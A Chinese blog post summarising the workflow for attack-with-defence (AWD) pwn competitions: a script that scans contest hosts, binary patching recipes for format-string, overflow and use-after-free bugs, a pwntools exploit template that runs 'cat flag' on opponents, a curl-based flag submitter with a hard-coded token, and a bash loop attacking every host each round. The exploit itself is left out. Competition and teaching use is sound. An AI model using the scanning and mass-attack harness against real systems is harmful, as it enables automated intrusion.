# AWD：PWN流程与技巧总结-先知社区

> **来源**: https://xz.aliyun.com/news/16447  
> **文章ID**: 16447

---

## 扫描IP

### init\_hosts.py

例：<http://192-168-1-X.awd.bugku.cn>

```
import requests
import threading

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

def check_ip(i):
    try:
        url = f'http://192-168-1-{i}.awd.bugku.cn/' #*
        response = requests.get(url, timeout=0.5)
        if response.status_code == 200:
            li('[+] ' + url)
            with open('hosts', 'a+') as f:
                f.write(f'192-168-1-{i}.awd.bugku.cn:9999\n') #*
        else:
            raise Exception("Not 200 OK")
    except Exception as e:
        ll('[-] ' + url)
        with open('h', 'a+') as f:
            f.write(f'192-168-1-{i}.awd.bugku.cn:9999\n') #*

NUM_THREADS = 256

threads = []
for i in range(1, 256):
    thread = threading.Thread(target=check_ip, args=(i,))
    threads.append(thread)
    thread.start()

    if len(threads) >= NUM_THREADS:
        for t in threads:
            t.join()
        threads = []

for t in threads:
    t.join()

```

## 防御

* 工具

  + `IDA`
  + 加沙箱：<https://github.com/TTY-flag/evilPatcher#/>

* <https://github.com/aftern00n/AwdPwnPatcher#/>

* 使用

  + 加沙箱通防

    - `sandboxs`里改禁用规则
    - `python3 evil_patcher.py file_name sandboxfile`
  + `IDA`的`patch`步骤：`Edit -> Patch program -> Apply patches to input file`
  + `AWDPwnPatcher`使用

    - `from AwdPwnPatcher import *binary = "filename"awd_pwn_patcher = AwdPwnPatcher(binary)`
    - `add_patch_in_ehframe(assembly="", machine_code=[])`
    - `patch_origin(start, end=0, assembly="", machine_code=[], string="")`
    - `patch_by_jmp(self, jmp_from, jmp_to=0, assembly="", machine_code=[])`
    - `patch_by_call(self, call_from, assembly="", machine_code=[])`
    - `add_constant_in_ehframe(self, string)`
    - `save(self, save_path="")`
  + 格式化字符串漏洞

    - `32`位

      ```
      from AwdPwnPatcher import *
      binary = "filename"
      awd_pwn_patcher = AwdPwnPatcher(binary)

      awd_pwn_patcher.patch_fmt_by_call(address)  #call printf地址
      awd_pwn_patcher.save()

      ```
    - `64`位

      ```
      from AwdPwnPatcher import *
      binary = "filename"
      awd_pwn_patcher = AwdPwnPatcher(binary)

      fmt_offset = awd_pwn_patcher.add_constant_in_ehframe("%s\\x00\\x00")  #添加%s

      assembly = """
      mov rsi, qword ptr [rbp-0x8]
      lea rdi, qword ptr [{}]
      """.format(hex(fmt_offset))

      awd_pwn_patcher.patch_by_jmp(0x706, jmp_to=0x712, assembly=assembly)    #改printf，mov rax地址和call printf地址
      awd_pwn_patcher.save()

      ```
  + 栈溢出

    ```
    from AwdPwnPatcher import *
    binary = "filename"
    awd_pwn_patcher = AwdPwnPatcher(binary)

    assembly = '''
    push 0x20   #缩小输入范围，控制寄存器push进去的值
    '''

    awd_pwn_patcher.patch_origin(0x8048476, end=0x804847b, assembly=assembly)   #原push地址和push的下一条地址
    awd_pwn_patcher.save()

    ```
  + `UAF`

    - `32`位

      ```
      from AwdPwnPatcher import *
      binary = "./filename"
      awd_pwn_patcher = AwdPwnPatcher(binary)

      assembly = """
      add esp, 0x10
      mov eax, 0
      mov edx, dword ptr [ebp - 0x20]
      mov eax, 0x804a060  #被释放的地址
      lea eax, dword ptr [eax + edx*4]
      mov dword ptr [eax], 0
      """

      awd_pwn_patcher.patch_by_jmp(0x80485bf, jmp_to=0x80485c7, assembly=assembly)    #call free地址和下一条地址
      awd_pwn_patcher.save()

      ```
    - `64`位

      ```
      from AwdPwnPatcher import *
      binary = "./filename"
      awd_pwn_patcher = AwdPwnPatcher(binary)

      assembly = """
      mov eax, 0
      mov eax, dword ptr [rbp - 0x1c]
      cdqe
      lea rdx, qword ptr [0x201040]
      lea rax, qword ptr [rdx + rax*8]
      mov qword ptr [rax], 0
      """

      awd_pwn_patcher.patch_by_jmp(0x838, jmp_to=0x83d, assembly=assembly)
      awd_pwn_patcher.save()

      ```
  + `gets` 栈溢出

    只有`gets`函数能够接受用户输入时，将流程劫持到`.eh_frame`段，利用`syscall`构造`read`函数，就能控制输入数据的长度。

    ```
    .eh_frame:0000000000400F7D mov     rax, 0          ;#define __NR_read 0
    .eh_frame:0000000000400F84 mov     rdi, 0          ; fd
    .eh_frame:0000000000400F8B lea     rsi, [rbp+buf]  ; buf
    .eh_frame:0000000000400F8E mov     rdx, 90h        ; count
    .eh_frame:0000000000400F95 syscall
    .eh_frame:0000000000400F97 jmp     loc_400AB4
    ```
  + 负数绕过：输入负数`-1`也满足`jle`，修复方法：将`JLE`改为`JBE`

    ```
    cmp     eax, 20h
    jle     short loc_8048777
    ```

## 攻击

### exp.py

```
#!/usr/bin/env python3
# A script for awd exp

import os
import sys
from time import sleep
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './pwn'

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')


def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + b'\n')
    fd.close()

ip = server_ip = sys.argv[1].split(':')[0]
port = int(sys.argv[1].split(':')[1])
r = remote(ip, port)

......  #exp

r.sendline(b'cat flag')
r.recvuntil(b'{')
flag = b'viol1t{' + r.recvuntil(b'}')
write_to_flags(flag)

r.interactive()

```

### submit\_flag.py

```
#!/usr/bin/env python3
# A script for awd loop submit flag
import threading
from time import sleep
import os
import json
import requests

flag_file = './flags'
threads = []

def submit(flag):
    try:
        # url = 'https://ctf.bugku.com/awd/submit.html?token=88b02ce3b420ec1f4b4a2e02dd6fe305&flag=' + flag[:-1]
        url = f"curl -X POST http://27.25.152.77:19999/api/flag -H 'Authorization: 7f120ca9b0e3024d06734a04a986cc55' -d '{{ \"flag\": \"{flag[:-1]}\"}}'"
        print(url)
        # r = requests.get(url)
        os.system(url)
        print('\x1b[01;38;5;214m[+] pwned!\x1b[0m')
    except Exception as e:
        print('\x1b[01;38;5;214m[-] connect fail: {}\x1b[0m'.format(str(e)))

def main():
    with open(flag_file) as flag_txt:
        flags = flag_txt.readlines()
        for flag in flags:
            thread = threading.Thread(target=submit, args=(flag,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()

```

### attack.sh

```
#! /bin/bash

attack_times=10000
round_wait_time=30 #half time
wait_submit_time=5
log_file="logs"
run_time=120 #timeout
next_attack_time=2.5 
max_concurrent_attacks=10 # Max number of concurrent attacks

log(){
    t=$(date "+%H:%M:%S")
    m="[$t]$1" # Fixed missing parameter usage
    info="\033[43;37m $m \033[0m"
    echo -e "$info"
    echo -e "$m" >> $log_file
}

attack() {
    echo "-- round $1 -- " >> all_flags
    cat flags >> all_flags
    rm flags
    local jobs=0
    for line in $(cat hosts); do
        timeout --foreground $run_time python3 ./exp.py "$line" &
        sleep $next_attack_time
        ((jobs++))
        if [ "$jobs" -ge "$max_concurrent_attacks" ]; then
            wait # Wait for all background jobs to finish
            jobs=0
        fi
    done
    wait # Ensure all attacks are complete before moving on
    echo -e "\x1b[47;30m Waiting $wait_submit_time s to submit flag\x1b[0m"
    sleep $wait_submit_time
    echo -e "\x1b[47;30m Submitting flag\x1b[0m"
    python3 ./submit_flag.py
}

for ((i=1; i <= attack_times; i++)); do
    m="-------- round $i --------"
    log "$m"
    attack $i
    echo -e "\x1b[47;30m Waiting next round\x1b[0m"
    sleep $round_wait_time
done

```

## 流量监控

### pwn\_waf

<https://github.com/i0gan/pwn_waf/tree/main>

创建一个文件夹并赋一定权限，改`makefile`中的`log path`为该文件夹地址，`make`后将`pwn`和`catch`放到创建的文件夹中，再用`catch`替换`pwn`文件，此时`exp`打用`catch`替换的`pwn`文件即可在创建的文件夹中接收到流量

## 总结流程

* 改`init_hosts.py`中的`ip`格式和`port`
* 改`submit_flag.py`中的提交方式和`token`
* 改`round_wait_time`
* `patch`
* 写`exp`
* 批量攻击
